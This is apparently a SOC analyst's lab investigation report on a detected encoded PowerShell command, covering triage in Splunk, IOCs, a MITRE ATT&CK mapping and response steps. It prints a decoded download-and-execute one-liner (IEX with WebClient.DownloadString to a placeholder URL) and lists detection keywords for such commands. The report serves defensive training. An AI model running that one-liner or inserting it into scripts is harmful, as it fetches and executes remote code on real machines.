# Investigation #03 — Suspicious Encoded PowerShell Command

**Report ID:** INV-003 | **Date:** 2026-09-29 | **Analyst:** Vaibhav Joshi | **Severity:** High | **Status:** Closed — True Positive

---

## 🚨 Alert

**Detection Rule:** T1059_powershell_encoded.spl

**Trigger:**
- Sysmon EventCode 1 — Process Creation (PowerShell with encoded command)

**Host:** Windows10-Victim (DESKTOP-5TRJPSS)

**Time:** 2026-09-29 06:36:15 PM (18:36:15 IST / 13:06:14 UTC)

---

## 🔍 Triage

**What happened:**
A PowerShell process was executed with an encoded command (`-EncodedCommand`) on the Windows victim machine. The parent process was also PowerShell, indicating a PowerShell-spawned-PowerShell execution — a common pattern in malicious script execution.

**Initial checks performed (Splunk-only):**
- Confirmed process creation: `index=main EncodedCommand`
- Total events: 1
- Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- CommandLine: `powershell.exe -EncodedCommand SQBFAFgA...`
- ParentImage: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- ParentCommandLine: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`
- User: `DESKTOP-5TRJPSS\varun`
- IntegrityLevel: High (elevated privileges)
- ProcessId: 4604
- ParentProcessId: 8900
- LogonId: 0x4f0e2

**Decoded command:**

```
IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload')
```

**Command analysis:**
- `IEX` (Invoke-Expression) — executes the downloaded content
- `Net.WebClient.DownloadString` — downloads remote payload
- `http://example.com/payload` — external URL
- Combined behavior: Download-and-execute — classic malware pattern

**Why this is suspicious:**
Legitimate PowerShell scripts do not typically use `-EncodedCommand` with remote download-and-execute behaviour. The combination of:
1. Encoded command (obfuscation)
2. Remote payload download
3. In-memory execution via IEX
4. Parent PowerShell spawning child PowerShell

...is a strong indicator of malicious activity matching multiple MITRE ATT&CK techniques.

**Note on parent process:**
Both `ParentImage` and `Image` are `powershell.exe` — PowerShell spawning PowerShell. In a real phishing scenario, the parent would typically be `WINWORD.EXE`, `EXCEL.EXE`, or a browser process.

---

## ⏱️ Timeline

| Time | Event | Source |
|---|---|---|
| 18:36:14.493 | Process creation: `powershell.exe -EncodedCommand ...` | Sysmon EventCode 1 |
| 18:36:14.493 | Parent process: `powershell.exe` (PID 8900) | Sysmon EventCode 1 |
| 18:36:15.047 | Event ingested by Splunk | Splunk `_time` |

---

## 🎯 Indicators of Compromise (IOCs)

| Type | Value | Source |
|---|---|---|
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `Image` field |
| CommandLine | `powershell.exe -EncodedCommand SQBFAFgA...` | `CommandLine` field |
| Parent Process | `powershell.exe` (PID 8900) | `ParentImage` field |
| Decoded Payload | `IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload')` | Decoded |
| URL | `http://example.com/payload` | Decoded command |
| User | `DESKTOP-5TRJPSS\varun` | `User` field |
| Integrity Level | High | `IntegrityLevel` field |
| Process ID | 4604 | `ProcessId` field |
| Parent Process ID | 8900 | `ParentProcessId` field |
| Logon ID | 0x4f0e2 | `LogonId` field |
| PowerShell Hash (MD5) | `2E5A8590CF648968FC23D3E1F251...` | `Hashes` field |
| Windows Event | Sysmon 1 (Process Creation) | `EventCode` field |

---

## ✅ Verdict

**True Positive** — Simulated attack in isolated lab environment.

In a real SOC environment, this would indicate:
- Initial access via phishing or malicious download
- A downloader executing in-memory via PowerShell
- Potential follow-on activity (C2, persistence, lateral movement)

**Recommended Response Actions:**
1. Isolate the host from the network
2. Terminate the suspicious PowerShell process (PID 4604)
3. Block the URL `http://example.com/payload` at the proxy
4. Check for additional child processes from PID 4604
5. Review network connections from the host (Sysmon Event 3)
6. Investigate how the initial script reached the host
7. Reset credentials for the affected user (`varun`)
8. Check for persistence mechanisms (Run keys, scheduled tasks)

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## 💡 Lessons Learned

**What went well:**
- Detection rule correctly identified encoded PowerShell execution
- Sysmon EventCode 1 captured full command line and parent process
- Decoding the Base64 payload revealed the actual intent

**What could be improved:**
- Add correlation rule: PowerShell spawning PowerShell with encoded command
- Flag encoded commands that contain `IEX`, `DownloadString`, `WebClient`
- Add parent process context to the alert (WINWORD, EXCEL, browser)
- Monitor outbound network connections from PowerShell processes
- Add URL extraction to the alert for faster blocking

**Analyst notes:**
Encoded PowerShell commands are extremely common in real attacks. They are used for:
1. Obfuscation — hiding the actual command from casual inspection
2. Bypassing filters — simple string-based detection fails
3. In-memory execution — leaving minimal disk artifacts

Always decode the Base64 payload during triage. The decoded command tells the real story.

**Decoding command used:**

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

**Splunk field extraction limitation:**
Sysmon EventCode 1 does not have `EventCode` as a standard field — the raw XML contains `EventID`. Raw event inspection was required.

**Lab observation:**
The command was executed directly on the victim machine for lab simplicity. In a real-world scenario, this would typically be delivered via phishing email attachment or exploit. The detection logic remains the same regardless of delivery method.

---

## 📸 Evidence

- Detection events: `../lab-setup/screenshots/24-powershell-events.png`
- Rule output: `../lab-setup/screenshots/13-powershell-rule.png`
